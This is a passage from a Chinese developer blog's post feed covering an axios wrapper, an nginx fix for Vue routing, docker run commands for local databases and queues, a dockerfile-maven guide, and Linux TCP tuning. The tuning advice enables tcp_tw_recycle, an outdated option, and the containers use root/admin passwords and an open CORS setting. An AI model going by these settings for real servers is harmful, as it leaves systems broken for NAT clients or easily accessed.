&#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 错误抛到业务代码</span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;请求超时或服务器异常，请检查网络或联系管理员！&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~</em></p>
<p><em>tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~</em></p>
<h3 id="支持-TypeScript"><a href="#支持-TypeScript" class="headerlink" title="支持 TypeScript"></a>支持 TypeScript</h3><p>由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。</p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// http.ts</span></span><br><span class="line"><span class="keyword">import</span> axios, &#123; AxiosRequestConfig, AxiosResponse &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> showStatus = <span class="function">(<span class="params">status: <span class="built_in">number</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">switch</span> (status) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">400</span>:</span><br><span class="line">      message = <span class="string">&#x27;请求错误(400)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">      message = <span class="string">&#x27;未授权，请重新登录(401)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">403</span>:</span><br><span class="line">      message = <span class="string">&#x27;拒绝访问(403)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">404</span>:</span><br><span class="line">      message = <span class="string">&#x27;请求出错(404)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">408</span>:</span><br><span class="line">      message = <span class="string">&#x27;请求超时(408)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line">      message = <span class="string">&#x27;服务器错误(500)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">501</span>:</span><br><span class="line">      message = <span class="string">&#x27;服务未实现(501)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">502</span>:</span><br><span class="line">      message = <span class="string">&#x27;网络错误(502)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">503</span>:</span><br><span class="line">      message = <span class="string">&#x27;服务不可用(503)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">504</span>:</span><br><span class="line">      message = <span class="string">&#x27;网络超时(504)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">505</span>:</span><br><span class="line">      message = <span class="string">&#x27;HTTP版本不受支持(505)&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      message = <span class="string">`连接出错(<span class="subst">$&#123;status&#125;</span>)!`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;message&#125;</span>，请检查网络或联系管理员！`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">  <span class="comment">// 联调</span></span><br><span class="line">  <span class="attr">baseURL</span>: process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span> ? <span class="string">`/`</span> : <span class="string">&#x27;/apis&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="attr">get</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded;charset=utf-8&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">post</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 是否跨站点访问控制请求</span></span><br><span class="line">  <span class="attr">withCredentials</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">30000</span>,</span><br><span class="line">  <span class="attr">transformRequest</span>: [<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    data = <span class="built_in">JSON</span>.stringify(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;],</span><br><span class="line">  validateStatus () &#123;</span><br><span class="line">    <span class="comment">// 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">transformResponse</span>: [<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data === <span class="string">&#x27;string&#x27;</span> &amp;&amp; data.startsWith(<span class="string">&#x27;&#123;&#x27;</span>)) &#123;</span><br><span class="line">      data = <span class="built_in">JSON</span>.parse(data)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line">service.interceptors.request.use(<span class="function">(<span class="params">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 错误抛到业务代码</span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;服务器异常，请联系管理员！&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response: AxiosResponse</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> status = response.status</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (status &lt; <span class="number">200</span> || status &gt;= <span class="number">300</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理http错误，抛到业务代码</span></span><br><span class="line">        msg = showStatus(status)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> response.data === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">            response.data = &#123;msg&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            response.data.msg = msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">&#125;, <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 错误抛到业务代码</span></span><br><span class="line">    error.data = &#123;&#125;</span><br><span class="line">    error.data.msg = <span class="string">&#x27;请求超时或服务器异常，请检查网络或联系管理员！&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 服务部署 Vue 项目后,出现 404 问题</title>
    <url>/post/59640/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found</p>
<span id="more"></span>

<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象</p>
<p>在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下：</p>
<figure class="highlight glsl"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name www.test.com;</span><br><span class="line">    <span class="keyword">index</span> <span class="keyword">index</span>.php <span class="keyword">index</span>.html <span class="keyword">index</span>.htm <span class="keyword">default</span>.php <span class="keyword">default</span>.htm <span class="keyword">default</span>.html;</span><br><span class="line">    root /www/wwwroot/test/dist;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#vue-router配置</span></span><br><span class="line">    <span class="keyword">location</span> / &#123;</span><br><span class="line">        try_files $uri $uri/ @router;</span><br><span class="line">        <span class="keyword">index</span> <span class="keyword">index</span>.html;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">location</span> @router &#123;</span><br><span class="line">        rewrite ^.*$ /<span class="keyword">index</span>.html last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启 nginx 后，页面可以正常访问</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 本地开发容器集合</title>
    <url>/post/58712/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自己常用的容器集合，做个记录</p>
<span id="more"></span>

<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">--name redis \</span><br><span class="line">--network dev \</span><br><span class="line">-p 6379:6379 \</span><br><span class="line">-v ~/docker/data/redis/:/data \</span><br><span class="line">-v ~/docker/conf/redis/:/etc/redis/ \</span><br><span class="line">-d redis:latest \</span><br><span class="line">redis-server /etc/redis/redis.conf \</span><br><span class="line">--appendonly yes</span><br></pre></td></tr></table></figure>

<ul>
<li>参数解释<ul>
<li><code>redis-server /etc/redis/redis.conf</code> - 以配置文件启动redis</li>
<li><code>appendonly yes</code> - 开启redis持久化，也可从配置文件中开启</li>
</ul>
</li>
</ul>
<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name mysql \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 3306:3306 \</span><br><span class="line">  -v ~/docker/data/mysql:/var/lib/mysql \</span><br><span class="line">  -v ~/docker/conf/mysql:/etc/mysql/conf.d \</span><br><span class="line">  -e MYSQL_ROOT_PASSWORD=root \</span><br><span class="line">  -d mysql:latest</span><br></pre></td></tr></table></figure>

<ul>
<li>参数解释<ul>
<li><code>MYSQL_ROOT_PASSWORD=root</code> - 设置数据库密码为root</li>
</ul>
</li>
</ul>
<h3 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name mongo \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 27017:27017 \</span><br><span class="line">  -v ~/docker/data/mongo:/data/db \</span><br><span class="line">  -e MONGO_INITDB_ROOT_USERNAME=root \</span><br><span class="line">  -e MONGO_INITDB_ROOT_PASSWORD=root \</span><br><span class="line">  -d mongo:latest</span><br></pre></td></tr></table></figure>

<ul>
<li>参数解释<ul>
<li><code>MONGO_INITDB_ROOT_USERNAME=root</code> - 设置用户名</li>
<li><code>MONGO_INITDB_ROOT_PASSWORD=root</code> - 设置密码</li>
</ul>
</li>
</ul>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">  --name php7.4 \</span><br><span class="line">  --network dev \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  -v ~/wwwroot:/wwwroot \</span><br><span class="line">  -d php:7.4</span><br></pre></td></tr></table></figure>

<ul>
<li>额外操作<ul>
<li><code>pecl install redis &amp;&amp; docker-php-ext-enable redis</code> - 添加redis支持</li>
<li><code>pecl install swoole &amp;&amp; docker-php-ext-enable swoole</code> - 添加swoole支持</li>
<li><code>docker-php-ext-install pdo pdo_mysql</code> - 添加pdo支持</li>
</ul>
</li>
</ul>
<h3 id="Dozzle"><a href="#Dozzle" class="headerlink" title="Dozzle"></a>Dozzle</h3><p>Dozzle 是一个小型的轻量级的日志监控程序，它有一个基于 web 的界面来监视 Docker 日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --name dozzle \</span><br><span class="line">  --volume=/var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">  -p 8888:8080 \</span><br><span class="line">  -d amir20/dozzle:latest</span><br></pre></td></tr></table></figure>

<p>具体配置参考: <a href="https://hub.docker.com/r/amir20/dozzle">https://hub.docker.com/r/amir20/dozzle</a></p>
<h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>Elasticsearch 是一个分布式、 RESTful 搜索和分析引擎</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line"> --name es \</span><br><span class="line"> --net dev \</span><br><span class="line"> -p 9200:9200 \</span><br><span class="line"> -p 9300:9300 \</span><br><span class="line"> -e <span class="string">&quot;discovery.type=single-node&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.enabled=true&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-origin=*&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-headers=X-Requested-With,X-Auth-Token,Content-Type,Content-Length,Authorization&quot;</span> \</span><br><span class="line"> -e <span class="string">&quot;http.cors.allow-credentials=true&quot;</span> \</span><br><span class="line"> -d elasticsearch:7.14</span><br></pre></td></tr></table></figure>

<ul>
<li>参数解释<ul>
<li><code>discovery.type=single-node</code> - 单机运行</li>
</ul>
</li>
</ul>
<blockquote>
<p>如果启动不了，可以加大内存设置：<code>-e ES_JAVA_OPTS=&quot;-Xms512m -Xmx512m&quot;</code></p>
</blockquote>
<h4 id="中文分词"><a href="#中文分词" class="headerlink" title="中文分词"></a>中文分词</h4><p>进入容器内部后执行, 完成后重启es容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.14.0/elasticsearch-analysis-ik-7.14.0.zip</span><br></pre></td></tr></table></figure>

<h4 id="可视化工具"><a href="#可视化工具" class="headerlink" title="可视化工具"></a>可视化工具</h4><p>现代化的 Elasticsearch Web UI</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -p 1358:1358 -d appbaseio/dejavu1</span><br></pre></td></tr></table></figure>

<p>具体配置参考: <a href="https://hub.docker.com/r/appbaseio/dejavu">https://hub.docker.com/r/appbaseio/dejavu</a></p>
<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  --network dev \</span><br><span class="line">  --hostname my-rabbit \</span><br><span class="line">  --name some-rabbit \</span><br><span class="line">  -p 15672:15672 \</span><br><span class="line">  -p 5672:5672 \</span><br><span class="line">  -v ~/docker/data/rabbitmq/:/var/lib/rabbitmq/ \</span><br><span class="line">  -e RABBITMQ_DEFAULT_USER=admin \</span><br><span class="line">  -e RABBITMQ_DEFAULT_PASS=admin \</span><br><span class="line">  -d rabbitmq:3.8.18-management</span><br></pre></td></tr></table></figure>

<ul>
<li>参数解释<ul>
<li><code>--hostname my-rabbit</code> - 主机名</li>
<li><code>RABBITMQ_DEFAULT_USER=admin</code> - 设置默认账户</li>
<li><code>RABBITMQ_DEFAULT_PASS=admin</code> - 设置默认密码</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile-maven 构建镜像</title>
    <url>/post/9563/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Maven</code> 有几个 <code>Docker</code> 插件可以使用，这里使用的是由 <code>Spotify</code> 公司开发的 <code>Maven</code> 插件，由于<code>docker-maven-plugin</code> 这个插件已经不推荐使用了，<code>docker-maven-plugin</code> 插件可以不使用 <code>Dockerfile</code> 而直接在 <code>pom.xml</code> 中来构建镜像，这种方式可能导致很多不必要的混淆，所以推荐更好的 <code>dockerfile-maven</code> 插件作为替代</p>
<span id="more"></span>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>具体可参考官方用例：<a href="https://github.com/spotify/dockerfile-maven/tree/master/plugin/src/it/advanced">https://github.com/spotify/dockerfile-maven/tree/master/plugin/src/it/advanced</a></p>
<h4 id="添加插件"><a href="#添加插件" class="headerlink" title="添加插件"></a>添加插件</h4><p>在项目的 <code>pom.xml</code> 中添加 <code>dockerfile-maven</code> 插件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.spotify<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dockerfile-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;docker.plugin.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>default<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>build<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span>$&#123;docker.image.prefix&#125;/$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">buildArgs</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">JAR_FILE</span>&gt;</span>target/$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">JAR_FILE</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">buildArgs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>插件配置说明</p>
<ul>
<li><p>repository : 用于命名构建镜像的存储库</p>
</li>
<li><p>tag : 是标签名称，这里指定标签名为 <code>pom</code> 中的 <code>$&#123;project.version&#125;</code></p>
</li>
<li><p>buildArgs : 为构建参数，可以在构建里将参数传到 <code>Dockerfile</code> 中，<code>$&#123;project.build.finalName&#125;</code> 表示打包后 <code>jar</code> 包的名称。这里是将 <code>jar</code> 的路径传递到 <code>Dockerfile</code> 中</p>
</li>
<li><p>executions : 这里设置把插件的 <code>goal</code> 绑定到某个 <code>phase</code> 上，实现打包完成后自动构建镜像并推送，这里没有配置远程仓库因此不推送到远程仓库</p>
</li>
</ul>
<blockquote>
<p><code>phase</code> 和 <code>goal</code> 可以这样理解：<code>maven</code> 命令格式是：<code>mvn phase:goal</code> , 例如 <code>mvn package dockerfile:build</code> 那么 <code>package</code> 和 <code>dockerfile</code> 都是 <code>phase</code>, <code>build</code> 则是 <code>goal</code> 。</p>
</blockquote>
<h4 id="添加-Dockerfile"><a href="#添加-Dockerfile" class="headerlink" title="添加 Dockerfile"></a>添加 Dockerfile</h4><p>在项目根目录添加Dockerfile 文件，内容如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /tmp</span></span><br><span class="line"><span class="keyword">ARG</span> JAR_FILE</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> <span class="variable">$&#123;JAR_FILE&#125;</span> app.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8010</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;java&quot;</span>,<span class="string">&quot;-Djava.security.egd=file:dev/./urandom&quot;</span>,<span class="string">&quot;-jar&quot;</span>,<span class="string">&quot;/app.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>表示接收构建参数 <code>JAR_FILE</code> 这个参数在前面的 <code>pom.xml</code>中配置插件时已经添加。参数内容为 <code>jar</code> 的的路径，<code>$&#123;JAR_FILE&#125;</code> 则是使用传递进来的参数</p>
<h4 id="Docker-远程"><a href="#Docker-远程" class="headerlink" title="Docker 远程"></a>Docker 远程</h4><p>需要开启服务器 <code>Docker</code> 的远程访问，具体可以参考网络相关文章</p>
<p>打开 <code>IDEA</code> 中的 <code>Services</code> 面板</p>
<p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814123702.png"></p>
<p>点击 <code>Add service &gt; Docker Connection</code> 来添加一个 <code>Docker</code> 连接</p>
<p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814124029.png"></p>
<blockquote>
<p><code>dockerfile-maven</code> 插件就是通过在本机操作 <code>Docker api</code> 构建镜像，因此本机上不需要安装 <code>Docker</code>，能够访问到 <code>Docker</code> 服务器即可</p>
</blockquote>
<h4 id="构建-image"><a href="#构建-image" class="headerlink" title="构建 image"></a>构建 image</h4><p><code>Docker</code> 构建过程已经集成到了 <code>Maven</code> 的构建过程之中，可以直接使用 <code>mvn package</code> 同时打包和构建 <code>Docker</code> 镜像</p>
<p>在 <code>IDEA</code> 中可以直接点击插件对应的命令运行</p>
<p><img src="https://gitee.com/jhon_walker/images/raw/master/path/20210814124600.png"></p>
<h4 id="镜像-tag"><a href="#镜像-tag" class="headerlink" title="镜像 tag"></a>镜像 tag</h4><p>在使用上面的方式生成镜像时，我们前面在 <code>pom.xml</code> 中已经配置了构建时的 <code>tag</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不配置这个参数，默认生成的 <code>tag</code> 是 <code>latest</code></p>
<p>有时想修改成自己的 <code>tag</code> ，可以通过 <code>dockerfile:tag</code> 修改，但需要先把 <code>pom.xml</code> 中指定的 <code>tag</code> 配置去掉</p>
<p>在 <code>pom.xml</code> 中删除如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tag</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">tag</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着使用如下 <code>maven</code> 命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn dockerfile:tag -Ddockerfile.tag=myApp</span><br></pre></td></tr></table></figure>

<p>执行完成后 <code>Docker</code> 服务器上会出现一个 <code>tag</code> 为 <code>myApp</code> 的新镜像。</p>
<p>同样的，如果在 <code>pom</code> 中没有指定 <code>tag</code>，在使用 <code>dockerfile:build</code> 构建新镜像时也可以指定 <code>tag</code> 名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn dockerfile:build -Ddockerfile.tag=consumer</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 网络内核参数优化</title>
    <url>/post/43734/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在硬件资源有限的情况下，最大的压榨服务器的性能，提高服务器的并发处理能力，是很多运维技术人员思考的问题</p>
<span id="more"></span>

<h3 id="TIME-WAIT"><a href="#TIME-WAIT" class="headerlink" title="TIME_WAIT"></a>TIME_WAIT</h3><p>Linux系统下，TCP连接断开后，会以TIME_WAIT状态保留一定的时间，然后才会释放端口。当并发请求过多的时候，就会产生大量的TIME_WAIT状态的连接，无法及时断开的话，会占用大量的端口资源和服务器资源，可以优化TCP的内核参数，来及时将TIME_WAIT状态的端口清理掉。</p>
<p>查看当前TCP连接的状态和对应的连接数量：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netstat -n | awk <span class="string">&#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>输出类似下面的结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">LAST_ACK 1</span><br><span class="line">ESTABLISHED 482</span><br><span class="line">FIN_WAIT1 4</span><br><span class="line">TIME_WAIT 1780</span><br></pre></td></tr></table></figure>

<p>只用关心TIME_WAIT的个数，数量过大的话就有必要调整下Linux的TCP内核参数，让系统更快的释放TIME_WAIT连接</p>
<p>用vim打开配置文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure>

<p>加入下面的内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭</span></span><br><span class="line">net.ipv4.tcp_syncookies = 1</span><br><span class="line"><span class="comment"># 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭</span></span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line"><span class="comment"># 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭</span></span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line"><span class="comment"># 修改系統默认的 TIMEOUT 时间</span></span><br><span class="line">net.ipv4.tcp_fin_timeout = 30</span><br></pre></td></tr></table></figure>

<p>让内核参数生效：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<p>经过这样的调整之后，除了会进一步提升服务器的负载能力之外，还能够防御小流量程度的DoS、CC和SYN攻击。</p>
<p>此外，如果连接数本身就很多，还可以再优化一下TCP的可使用端口范围，进一步提升服务器的并发能力。依然是往上面的参数文件中，加入下面这些配置：</p>
